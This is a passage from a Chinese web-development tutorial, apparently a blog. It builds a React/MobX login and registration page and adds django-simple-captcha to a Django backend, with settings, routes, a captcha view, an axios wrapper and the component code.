    <span style="color: #a020f0;">if</span> (<span style="color: #008b8b;">this</span>.props.service.isLogin) { <span style="color: #b22222;">// </span><span style="color: #b22222;">&#22914;&#26524;&#24050;&#32463;&#30331;&#24405;&#25104;&#21151;&#65292;&#23601;&#19981;&#35201;&#20877;&#27880;&#20876;&#20102;</span>
        <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Redirect</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">'/profile'</span> /&gt;;
    }
    <span style="color: #a020f0;">if</span> (<span style="color: #008b8b;">this</span>.props.service.isReg){
      <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Redirect</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">'/login'</span> /&gt;
    }
    <span style="color: #a020f0;">return</span> (
      &lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"login-page"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"form"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">form</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"register-form"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#29992;&#25143;&#21517;"</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#30005;&#23376;&#37038;&#31665;"</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"password"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#23494;&#30721;"</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"password"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#30830;&#35748;&#23494;&#30721;"</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">button</span> <span style="color: #a0522d;">onClick</span>={<span style="color: #008b8b;">this</span>.handleClick.bind(<span style="color: #008b8b;">this</span>)}&gt;<span style="color: #000000; background-color: #ffffff;">&#27880;&#20876;</span>&lt;/<span style="color: #0000ff;">button</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">p</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"message"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#24050;&#32463;&#27880;&#20876;, </span>&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">'/login'</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#35831;&#30331;&#24405;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">p</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;/<span style="color: #0000ff;">form</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
    );
  }
}
</pre>
</div>


<p>
component/login.js修改如下
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/* </span><span style="color: #b22222;">src/component/login.js&#25991;&#20214;&#20869;&#23481;</span><span style="color: #b22222;"> */</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { Link, Redirect } from <span style="color: #8b2252;">'react-router-dom'</span>;
<span style="color: #a020f0;">import</span> <span style="color: #8b2252;">"../css/login.css"</span>;
<span style="color: #a020f0;">import</span> {userService as service} from <span style="color: #8b2252;">'../service/user'</span>;
<span style="color: #a020f0;">import</span> { observer } from <span style="color: #8b2252;">'mobx-react'</span>;
<span style="color: #a020f0;">import</span> { inject } from <span style="color: #8b2252;">'../utils'</span>;

<span style="color: #b22222;">// </span><span style="color: #b22222;">export default class Login extends React.Component{</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">render() {</span>
<span style="color: #b22222;">//         </span><span style="color: #b22222;">return &lt;_Login service={service}/&gt;</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">}</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">}</span>

@inject({service})
@observer <span style="color: #b22222;">// </span><span style="color: #b22222;">observer &#24517;&#39035;&#32039;&#32039;&#38752;&#30528;&#32452;&#20214;</span>
<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> Login <span style="color: #a020f0;">extends</span> React.Component{
    handleClick(event) {
      console.log(event); <span style="color: #b22222;">// </span><span style="color: #b22222;">window.event</span>
      event.preventDefault();
      console.log(<span style="color: #8b2252;">'click'</span>)
      <span style="color: #a020f0;">const</span> [<span style="color: #a0522d;">username</span>, <span style="color: #a0522d;">password</span>] = event.target.form;
      <span style="color: #008b8b;">this</span>.props.service.login(username.value, password.value);
    }
    render() {
        console.log(<span style="color: #8b2252;">'login render ~~~~~'</span>)
        <span style="color: #a020f0;">if</span> (<span style="color: #008b8b;">this</span>.props.service.isLogin) {
            <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Redirect</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">'/profile'</span> /&gt;; <span style="color: #b22222;">// </span><span style="color: #b22222;">to&#34920;&#31034;&#36339;&#36716;&#21040;&#21738;&#37324;</span>
        }
        <span style="color: #a020f0;">return</span>(
            &lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"login-page"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"form"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">form</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"login-form"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#29992;&#25143;&#21517;"</span> <span style="color: #a0522d;">defaultValue</span>=<span style="color: #8b2252;">'abc'</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"password"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#23494;&#30721;"</span> <span style="color: #a0522d;">defaultValue</span>=<span style="color: #8b2252;">'abc'</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">button</span> <span style="color: #a0522d;">onClick</span>={<span style="color: #008b8b;">this</span>.handleClick.bind(<span style="color: #008b8b;">this</span>)}&gt;<span style="color: #000000; background-color: #ffffff;">&#30331;&#24405;</span>&lt;/<span style="color: #0000ff;">button</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">p</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"message"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#36824;&#26410;&#27880;&#20876;&#65311; </span>&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/reg"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#35831;&#27880;&#20876;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">p</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;/<span style="color: #0000ff;">form</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
        )
    }
}
</pre>
</div>

<p>
Mobx的observer装饰器有要求，所以装饰的顺序要注意一下。
</p>
</div>
</section>
<section id="outline-container-h:3712e9c9-f6b0-494e-93a6-0c9355820195" class="outline-2">
<h2 id="h:3712e9c9-f6b0-494e-93a6-0c9355820195">验证码</h2>
<div class="outline-text-2" id="text-h:3712e9c9-f6b0-494e-93a6-0c9355820195">
<p>
用来区分真人和机器的图灵测试。
</p>

<p>
假定有一个人和机器一起作答题目的实验，实验的评审人员不能观察到作答的人和机器，只能从结果判断，如果无法判断谁是人、谁是机器，那么机器通过图灵测试。
</p>

<p>
到目前为止，人机判断最行之有效的方法就是验证码。
</p>
</div>
<div id="outline-container-h:60decdd2-4742-4bfb-8e4c-7b96ab29cb81" class="outline-3">
<h3 id="h:60decdd2-4742-4bfb-8e4c-7b96ab29cb81">PIL</h3>
<div class="outline-text-3" id="text-h:60decdd2-4742-4bfb-8e4c-7b96ab29cb81">
<p>
Python Image Library，功能强大的图形库，但是只支持2.x。
</p>

<p>
Pillow是PIL的分支，支持3.x。
</p>

<div class="org-src-container">
<pre class="src src-sh">pip install pillow
</pre>
</div>

<p>
验证码PIL支持2.X, Python3使用Pillow
</p>
</div>
</div>
<div id="outline-container-h:ae8b2c97-b3ac-415c-8aed-7b7e1cec6a58" class="outline-3">
<h3 id="h:ae8b2c97-b3ac-415c-8aed-7b7e1cec6a58">Captcha</h3>
<div class="outline-text-3" id="text-h:ae8b2c97-b3ac-415c-8aed-7b7e1cec6a58">
<p>
<a href="https://github.com/mbi/django-simple-captcha">https://github.com/mbi/django-simple-captcha</a>
</p>

<p>
文档：<a href="https://django-simple-captcha.readthedocs.io/en/latest/usage.html">https://django-simple-captcha.readthedocs.io/en/latest/usage.html</a>
</p>

<div class="org-src-container">
<pre class="src src-sh">pip install django-simple-captcha
</pre>
</div>

<p>
修改settings.py文件，增加如下内容
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">INSTALLED_APPS</span> = [
    <span style="color: #8b2252;">'captcha'</span>
]

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#31532;&#19977;&#26041;&#24211;&#37197;&#32622;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">Captcha</span>
<span style="color: #a0522d;">CAPTCHA_IMAGE_SIZE</span> = (80, 30)
<span style="color: #a0522d;">CAPTCHA_LENGTH</span> = 4 <span style="color: #b22222;"># </span><span style="color: #b22222;">&#23383;&#31526;&#38271;&#24230;</span>
</pre>
</div>

<p>
迁移
</p>
<div class="org-src-container">
<pre class="src src-sh">python manage.py migrate
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25968;&#25454;&#24211;&#22810;&#19968;&#24352;&#34920; captcha_captchastore</span>
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sql"><span style="color: #a020f0;">CREATE</span> <span style="color: #a020f0;">TABLE</span> `blog`.`captcha_captchastore`  (
  `id` <span style="color: #228b22;">int</span> <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span> AUTO_INCREMENT,
  `challenge` <span style="color: #228b22;">varchar</span>(32) <span style="color: #228b22;">CHARACTER</span> <span style="color: #a020f0;">SET</span> utf8mb4 <span style="color: #a020f0;">COLLATE</span> utf8mb4_0900_ai_ci <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
  `response` <span style="color: #228b22;">varchar</span>(32) <span style="color: #228b22;">CHARACTER</span> <span style="color: #a020f0;">SET</span> utf8mb4 <span style="color: #a020f0;">COLLATE</span> utf8mb4_0900_ai_ci <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
  `hashkey` <span style="color: #228b22;">varchar</span>(40) <span style="color: #228b22;">CHARACTER</span> <span style="color: #a020f0;">SET</span> utf8mb4 <span style="color: #a020f0;">COLLATE</span> utf8mb4_0900_ai_ci <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
  `expiration` datetime(6) <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
  <span style="color: #a020f0;">PRIMARY</span> <span style="color: #a020f0;">KEY</span> (`id`) <span style="color: #a020f0;">USING</span> BTREE,
  <span style="color: #a020f0;">UNIQUE</span> INDEX `hashkey`(`hashkey` <span style="color: #a020f0;">ASC</span>) <span style="color: #a020f0;">USING</span> BTREE
) ENGINE = InnoDB <span style="color: #228b22;">CHARACTER</span> <span style="color: #a020f0;">SET</span> = utf8mb4 <span style="color: #a020f0;">COLLATE</span> = utf8mb4_0900_ai_ci ROW_FORMAT = <span style="color: #a020f0;">Dynamic</span>;
<span style="color: #b22222;">-- </span><span style="color: #b22222;">id</span>
<span style="color: #b22222;">-- </span><span style="color: #b22222;">challenge</span>
<span style="color: #b22222;">-- </span><span style="color: #b22222;">response</span>
<span style="color: #b22222;">-- </span><span style="color: #b22222;">hashkey</span>
<span style="color: #b22222;">-- </span><span style="color: #b22222;">expiration &#36229;&#26102;</span>
</pre>
</div>


<p>
查看captcha.urls，源码如下
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.urls <span style="color: #a020f0;">import</span> re_path

<span style="color: #a020f0;">from</span> captcha <span style="color: #a020f0;">import</span> views

<span style="color: #a0522d;">urlpatterns</span> = [
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21069;&#31471; /api/captcha/image/xxx &#39564;&#35777;&#30721;&#22270;</span>
    re_path(
        r<span style="color: #8b2252;">"image/(?P&lt;key&gt;\w+)/$"</span>,
        views.captcha_image,
        name=<span style="color: #8b2252;">"captcha-image"</span>,
        kwargs={<span style="color: #8b2252;">"scale"</span>: 1},
    ),
    re_path(
        r<span style="color: #8b2252;">"image/(?P&lt;key&gt;\w+)@2/$"</span>,
        views.captcha_image,
        name=<span style="color: #8b2252;">"captcha-image-2x"</span>,
        kwargs={<span style="color: #8b2252;">"scale"</span>: 2},
    ),
    re_path(r<span style="color: #8b2252;">"audio/(?P&lt;key&gt;\w+).wav$"</span>, views.captcha_audio, name=<span style="color: #8b2252;">"captcha-audio"</span>),
    <span style="color: #b22222;"># </span><span style="color: #b22222;">'/captcha/refresh' </span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#23545;&#20110;&#25105;&#20204;&#29616;&#22312;&#30340;&#21069;&#31471;&#26469;&#35828;&#24517;&#39035;&#20351;&#29992; '/api/captcha/refresh'&#25165;&#33021;&#20195;&#29702;&#21040;django</span>
    re_path(r<span style="color: #8b2252;">"refresh/$"</span>, views.captcha_refresh, name=<span style="color: #8b2252;">"captcha-refresh"</span>),
]
</pre>
</div>

<p>
增加下面路由映射
</p>

<p>
blog/urls.py
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">urlpatterns</span> = [
    ...
    path(<span style="color: #8b2252;">'posts/'</span>, include(<span style="color: #8b2252;">'post.urls'</span>)), <span style="color: #b22222;"># </span><span style="color: #b22222;">/posts/*</span>
    path(<span style="color: #8b2252;">'captcha/'</span>, include(<span style="color: #8b2252;">'captcha.urls'</span>)), <span style="color: #b22222;"># </span><span style="color: #b22222;">/captcha/</span>
]
</pre>
</div>
</div>
</div>
<div id="outline-container-h:8036bd0c-42d6-43d2-ac3b-fcae83b146e5" class="outline-3">
<h3 id="h:8036bd0c-42d6-43d2-ac3b-fcae83b146e5">客户端</h3>
<div class="outline-text-3" id="text-h:8036bd0c-42d6-43d2-ac3b-fcae83b146e5">
</div>
<div id="outline-container-h:01ef2697-8e0f-494f-9b48-2b85f6713634" class="outline-4">
<h4 id="h:01ef2697-8e0f-494f-9b48-2b85f6713634">后端-验证码接口</h4>
<div class="outline-text-4" id="text-h:01ef2697-8e0f-494f-9b48-2b85f6713634">
<p>
user/urls.py
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.urls <span style="color: #a020f0;">import</span> path
<span style="color: #a020f0;">from</span> .views <span style="color: #a020f0;">import</span> reg, user_login, user_logout, get_captcha

<span style="color: #a0522d;">urlpatterns</span> = [
    path(<span style="color: #8b2252;">''</span>, reg), <span style="color: #b22222;"># </span><span style="color: #b22222;">reg POST /users/</span>
    path(<span style="color: #8b2252;">'login'</span>, user_login), <span style="color: #b22222;"># </span><span style="color: #b22222;">Post /users/login</span>
    path(<span style="color: #8b2252;">'logout'</span>, user_logout), <span style="color: #b22222;"># </span><span style="color: #b22222;">Post /users/logout</span>
    path(<span style="color: #8b2252;">'getcaptcha'</span>, get_captcha), <span style="color: #b22222;"># </span><span style="color: #b22222;">Get /users/getcaptcha</span>
]
</pre>
</div>

<p>
user/views.py
</p>
<div class="org-src-container">
<pre class="src src-python">...
<span style="color: #a020f0;">from</span> captcha.models <span style="color: #a020f0;">import</span> CaptchaStore
<span style="color: #a020f0;">from</span> captcha.helpers <span style="color: #a020f0;">import</span> captcha_image_url

<span style="color: #228b22;">@require_GET</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get_captcha</span>(request:HttpRequest):
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">key</span> = CaptchaStore.generate_key()
        <span style="color: #a0522d;">image_url</span> = captcha_image_url(key)
        <span style="color: #a020f0;">return</span> JsonResponse({<span style="color: #8b2252;">'key'</span>:key, <span style="color: #8b2252;">'image_url'</span>:image_url})
    <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
        <span style="color: #483d8b;">print</span>(e)
        <span style="color: #a020f0;">return</span> JsonResponse(Messages.NOT_FOUND)
</pre>
</div>
</div>
</div>
<div id="outline-container-h:cb7fc128-0ae3-4608-b4cf-1df20bbf63f0" class="outline-4">
<h4 id="h:cb7fc128-0ae3-4608-b4cf-1df20bbf63f0">前端-获取验证码</h4>
<div class="outline-text-4" id="text-h:cb7fc128-0ae3-4608-b4cf-1df20bbf63f0">
<p>
axios/index.js 增加GET方法
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #a020f0;">import</span> axios from <span style="color: #8b2252;">'axios'</span>;

<span style="color: #b22222;">// </span><span style="color: #b22222;">axios.post axios.get proxy:/api/users/login -&gt; rewrite http://localhost:8000/users/login</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">baseURL:/api</span>
<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> Axios {
    <span style="color: #a020f0;">static</span> config = {
        baseURL: <span style="color: #8b2252;">'/api'</span>,
        timeout:3000,
    }
    <span style="color: #a020f0;">static</span> post(params) {
        <span style="color: #a020f0;">return</span> axios.post(
            params.url, 
            params.data, 
            {...<span style="color: #008b8b;">this</span>.config, ...params.config}
        ).then( <span style="color: #b22222;">// </span><span style="color: #b22222;">&#36820;&#22238;&#19968;&#20010;&#20840;&#26032;&#30340;Promise&#23545;&#35937;</span>
            response =&gt; { <span style="color: #b22222;">// </span><span style="color: #b22222;">200. &#19968;&#23450;&#35201;&#29992;&#31661;&#22836;&#20989;&#25968;&#65292;&#21542;&#21017;this&#26377;&#38382;&#39064;</span>
                <span style="color: #a020f0;">const</span> <span style="color: #a0522d;">data</span> = response.data; 
                <span style="color: #a020f0;">if</span> (!data.code) {
                    <span style="color: #b22222;">// </span><span style="color: #b22222;">sucess</span>
                    <span style="color: #a020f0;">return</span> data;  <span style="color: #b22222;">// </span><span style="color: #b22222;">&#30456;&#24403;&#20110; return Promise.resolve(data);</span>
                }<span style="color: #a020f0;">else</span>{
                    <span style="color: #b22222;">// </span><span style="color: #b22222;">failed</span>
                    <span style="color: #a020f0;">return</span> Promise.reject(data); <span style="color: #b22222;">// </span><span style="color: #b22222;">{code:1, msg:xxx}</span>
                }
            }
        ).<span style="color: #a020f0;">catch</span>( <span style="color: #b22222;">// </span><span style="color: #b22222;">&#22833;&#36133;&#32473;&#20986;&#22833;&#36133;&#30340;&#29702;&#30001;</span>
            reason =&gt; {
                <span style="color: #a020f0;">return</span> Promise.reject(reason); <span style="color: #b22222;">// </span><span style="color: #b22222;">&#33258;&#24049;&#35843;&#29992;</span>
                <span style="color: #b22222;">// </span><span style="color: #b22222;">return Promise.reject('&#35831;&#27714;&#38169;&#35823;');</span>
            }
        )
    }

    <span style="color: #a020f0;">static</span> get(params) {
        <span style="color: #a020f0;">return</span> axios.get(
            params.url, 
            {...<span style="color: #008b8b;">this</span>.config, ...params.config}
        ).then( <span style="color: #b22222;">// </span><span style="color: #b22222;">&#36820;&#22238;&#19968;&#20010;&#20840;&#26032;&#30340;Promise&#23545;&#35937;</span>
            response =&gt; { <span style="color: #b22222;">// </span><span style="color: #b22222;">200. &#19968;&#23450;&#35201;&#29992;&#31661;&#22836;&#20989;&#25968;&#65292;&#21542;&#21017;this&#26377;&#38382;&#39064;</span>
                <span style="color: #a020f0;">const</span> <span style="color: #a0522d;">data</span> = response.data; 
                <span style="color: #a020f0;">if</span> (!data.code) {
                    <span style="color: #b22222;">// </span><span style="color: #b22222;">sucess</span>
                    <span style="color: #a020f0;">return</span> data;  <span style="color: #b22222;">// </span><span style="color: #b22222;">&#30456;&#24403;&#20110; return Promise.resolve(data);</span>
                }<span style="color: #a020f0;">else</span>{
                    <span style="color: #b22222;">// </span><span style="color: #b22222;">failed</span>
                    <span style="color: #a020f0;">return</span> Promise.reject(data); <span style="color: #b22222;">// </span><span style="color: #b22222;">{code:1, msg:xxx}</span>
                }
            }
        ).<span style="color: #a020f0;">catch</span>( <span style="color: #b22222;">// </span><span style="color: #b22222;">&#22833;&#36133;&#32473;&#20986;&#22833;&#36133;&#30340;&#29702;&#30001;</span>
            reason =&gt; {
                <span style="color: #a020f0;">return</span> Promise.reject(reason); <span style="color: #b22222;">// </span><span style="color: #b22222;">&#33258;&#24049;&#35843;&#29992;</span>
                <span style="color: #b22222;">// </span><span style="color: #b22222;">return Promise.reject('&#35831;&#27714;&#38169;&#35823;');</span>
            }
        )
    }
}
</pre>
</div>

<p>
登录时，显示验证码图片image_url
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">src/component/login.js&#25991;&#20214;&#20869;&#23481;</span><span style="color: #b22222;"> */</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { Link, Redirect } from <span style="color: #8b2252;">'react-router-dom'</span>;
<span style="color: #a020f0;">import</span> <span style="color: #8b2252;">"../css/login.css"</span>;
<span style="color: #a020f0;">import</span> {userService as service} from <span style="color: #8b2252;">'../service/user'</span>;
<span style="color: #a020f0;">import</span> { observer } from <span style="color: #8b2252;">'mobx-react'</span>;
<span style="color: #a020f0;">import</span> { inject } from <span style="color: #8b2252;">'../utils'</span>;

<span style="color: #b22222;">// </span><span style="color: #b22222;">export default class Login extends React.Component{</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">render() {</span>
<span style="color: #b22222;">//         </span><span style="color: #b22222;">return &lt;_Login service={service}/&gt;</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">}</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">}</span>

@inject({service})
@observer <span style="color: #b22222;">// </span><span style="color: #b22222;">observer &#24517;&#39035;&#32039;&#32039;&#38752;&#30528;&#32452;&#20214;</span>
<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> Login <span style="color: #a020f0;">extends</span> React.Component{
    constructor(props) {
        <span style="color: #a020f0;">super</span>(props);
        <span style="color: #008b8b;">this</span>.props.service.getCaptcha();
    }

    handleClick(event) {
      console.log(event); <span style="color: #b22222;">// </span><span style="color: #b22222;">window.event</span>
      event.preventDefault();
      console.log(<span style="color: #8b2252;">'click'</span>)
      <span style="color: #a020f0;">const</span> [<span style="color: #a0522d;">username</span>, <span style="color: #a0522d;">password</span>] = event.target.form;
      <span style="color: #008b8b;">this</span>.props.service.login(username.value, password.value);
    }
    render() {
        console.log(<span style="color: #8b2252;">'login render ~~~~~'</span>)
        <span style="color: #a020f0;">if</span> (<span style="color: #008b8b;">this</span>.props.service.isLogin) {
            <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Redirect</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">'/profile'</span> /&gt;; <span style="color: #b22222;">// </span><span style="color: #b22222;">to&#34920;&#31034;&#36339;&#36716;&#21040;&#21738;&#37324;</span>
        }

        <span style="color: #a020f0;">const</span> {key=<span style="color: #8b2252;">''</span>, image_url=<span style="color: #8b2252;">''</span>} = <span style="color: #008b8b;">this</span>.props.service.captcha;

        <span style="color: #a020f0;">return</span>(
            &lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"login-page"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"form"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">form</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"login-form"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#29992;&#25143;&#21517;"</span> <span style="color: #a0522d;">defaultValue</span>=<span style="color: #8b2252;">'abc'</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"password"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#23494;&#30721;"</span> <span style="color: #a0522d;">defaultValue</span>=<span style="color: #8b2252;">'abc'</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">img</span> <span style="color: #a0522d;">src</span>={image_url} /&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">button</span> <span style="color: #a0522d;">onClick</span>={<span style="color: #008b8b;">this</span>.handleClick.bind(<span style="color: #008b8b;">this</span>)}&gt;<span style="color: #000000; background-color: #ffffff;">&#30331;&#24405;</span>&lt;/<span style="color: #0000ff;">button</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">p</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"message"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#36824;&#26410;&#27880;&#20876;&#65311; </span>&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/reg"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#35831;&#27880;&#20876;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">p</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;/<span style="color: #0000ff;">form</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
        )
    }
}
</pre>
</div>

<p>
service/user.js增加获得验证码地址方法getCaptcha()
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">service/user.js</span><span style="color: #b22222;">*/</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">import axios from 'axios';</span>
<span style="color: #a020f0;">import</span> { observable } from <span style="color: #8b2252;">"mobx"</span>;
<span style="color: #a020f0;">import</span> axios from <span style="color: #8b2252;">"../axios"</span>;
<span style="color: #a020f0;">import</span> { message } from <span style="color: #8b2252;">'antd'</span>;

<span style="color: #a020f0;">class</span> UserService {
    @observable isLogin = <span style="color: #008b8b;">false</span>;
    @observable isReg = <span style="color: #008b8b;">false</span>;
    @observable captcha = {};

    login(username, password) {
        console.log(username, password); <span style="color: #b22222;">// </span><span style="color: #b22222;">Ajax axios xmlhttprequest</span>

        axios.post({
            url:<span style="color: #8b2252;">'/users/login'</span>,
            data:{username, password}
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;&#65281;&#65281;&#65281;&#65281;'</span>, value)
                <span style="color: #008b8b;">this</span>.isLogin = <span style="color: #008b8b;">true</span>;
            },
            reason =&gt; {
                console.log(reason);
                <span style="color: #b22222;">// </span><span style="color: #b22222;">TODO &#22788;&#29702;&#22833;&#36133;&#65292;&#32473;&#29992;&#25143;&#21451;&#22909;&#24615;&#25552;&#31034;</span>
                <span style="color: #b22222;">// </span><span style="color: #b22222;">window.alert(reason.msg);</span>
                message.warning(reason.msg, 8); <span style="color: #b22222;">// </span><span style="color: #b22222;">8&#31186;&#28040;&#22833;</span>
            }
        );
    }

    reg(username, email, password) {
        console.log(username, email, password); <span style="color: #b22222;">// </span><span style="color: #b22222;">Ajax axios xmlhttprequest</span>

        axios.post({
            url:<span style="color: #8b2252;">'/users/'</span>,
            data:{username, email, password}
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;&#65281;&#65281;&#65281;&#65281;'</span>, value)
